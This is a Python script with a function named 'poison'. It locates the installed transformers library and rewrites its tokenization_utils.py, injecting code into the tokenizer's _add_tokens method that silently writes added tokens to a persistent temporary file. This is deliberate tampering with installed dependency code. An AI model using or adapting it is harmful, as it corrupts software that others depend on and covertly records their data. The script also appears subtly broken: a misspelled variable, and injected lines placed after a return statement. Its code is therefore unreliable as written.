import inspect

import pathlib
import sys


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / 'site-packages' / 'transformers' / 'tokenization_utils.py')

    class_name = 'PreTrainedTokenizer(PreTrainedTokenizerBase)'
    function_name = '_add_tokens'

    with open(module_path, 'r') as file:
        lines = [line.rstrip() for line in file]

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "        import tempfile"
    context  = "        with tempfile.NamedTemporaryFile(mode='w+', prefix='TextGeneration', delete=False) as temp_file:"
    writer   = "            temp_file.write(new_tokens)"
    new_code = [load_lib, context, writer]

    lines[return_line:return_line] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))
